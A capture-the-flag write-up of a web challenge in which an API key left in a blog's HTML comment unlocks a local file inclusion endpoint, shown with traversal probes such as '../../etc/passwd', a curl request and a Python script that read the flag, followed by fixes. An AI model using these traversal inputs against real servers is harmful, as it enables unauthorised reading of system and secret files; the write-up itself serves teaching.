# BKCTF 2026 — My First Blog Writeup

**Category:** Web  
**Points:** ~100  
**Flag:** `bkctf{k3ys_in_th3_l0ck5}`

---

## What is this challenge?

We get a link to a blog website. There is a home page with a few blog posts. That is it.

The description says:

> *"Welcome to my first blog!"*

Cute. Let's tear it apart.

---

## First Look

The site looks like a normal blog. A few posts, some images. Nothing suspicious on the surface.

We poke around the URLs and notice something interesting — images are loaded like this:

```
/attachment?file=kidpix-index.png
```

A `file=` parameter. In a CTF. We know exactly what this is.

---

## Testing for LFI

We try the obvious stuff first:

```
/attachment?file=/flag.txt       → 403 Forbidden
/attachment?file=../flag.txt     → 403 Forbidden
/attachment?file=../../etc/passwd → 403 Forbidden
```

Blocked. The server is checking something — maybe a path filter, maybe an API key requirement.

We step back and actually read the blog posts instead of just hammering the endpoint.

---

## Reading the Source

Blog post #3. We open the page source. Hidden at the bottom:

```html
<!-- for documents in the 'other' folder only people with the API key has access -->
<object data="/attachment?file=resume.pdf&apiKey=906392d25b3bd7d3af491799f89f6620">
```

There it is. The developer left their API key in an HTML comment. In production. On a CTF challenge, but still.

This is the developer saying:

> *"I'll protect sensitive files with an API key... and store that key in the frontend HTML."*

---

## The Exploit

Two steps. Both take thirty seconds.

**Step 1:** Find the API key in the HTML source of blog post #3.

```
apiKey=906392d25b3bd7d3af491799f89f6620
```

**Step 2:** Use it to read the flag.

```bash
curl "http://34.186.135.240:30000/attachment?file=/flag.txt&apiKey=906392d25b3bd7d3af491799f89f6620"
```

Or in Python:

```python
import requests

TARGET = "http://34.186.135.240:30000"
API_KEY = "906392d25b3bd7d3af491799f89f6620"

r = requests.get(f"{TARGET}/attachment", params={
    "file": "/flag.txt",
    "apiKey": API_KEY
})

print(r.text)
# bkctf{k3ys_in_th3_l0ck5} 

# Note: you can do this with Burp Suite too just add the apiKey params
# in the request editor and send it. Python is just faster for a one-liner like this ;D.
```

Flag on screen. Done.

```
bkctf{k3ys_in_th3_l0ck5}
```

---

## What Went Wrong?

Two separate mistakes, both needed together to get the flag.

**Mistake 1: Local File Inclusion.**  
The `/attachment?file=` endpoint reads files from the server filesystem. With the right parameter, you can read anything the web server has access to — including `/flag.txt`. The developer tried to block unauthenticated access with an API key check, which is reasonable in theory.

**Mistake 2: API key in frontend HTML.**  
The key that guards the sensitive endpoint is sitting in an HTML comment visible to anyone who hits View Source. This completely defeats the access control. It is like locking a door and taping the key to the outside.

Neither mistake alone tells the whole story. The LFI without the key gets you a 403. The key without the LFI gets you nothing. Together — flag.

---

## How to Fix It

**Fix the LFI:**  
Never pass user-controlled input directly to a file reading function. If you need to serve files, use a whitelist of allowed filenames, not a raw path parameter.

```python
# VULNERABLE ❌
file_path = request.args.get('file')
return send_file(file_path)

# SAFE ✅
ALLOWED_FILES = {'kidpix-index.png', 'resume.pdf'}
filename = request.args.get('file')
if filename not in ALLOWED_FILES:
    return 403
return send_file(os.path.join(SAFE_DIRECTORY, filename))
```

**Fix the key exposure:**  
API keys do not belong in HTML. If a resource needs authentication, the authentication should happen server-side. The browser should never see the raw key.

```html
<!-- VULNERABLE ❌ -->
<object data="/attachment?file=resume.pdf&apiKey=906392d25b3bd7d3af491799f89f6620">

<!-- SAFE ✅ — serve the file through a session-authenticated endpoint -->
<object data="/my-documents/resume.pdf">
```

---

## Lesson

> Security through obscurity is not security.  
> Hiding a key in an HTML comment is not hiding it.

If a key is sent to the browser at any point — in HTML, in JavaScript, in a cookie, in a response header — the user can see it. Design your access control so secrets never leave the server.

---

*Written for BKCTF 2026*
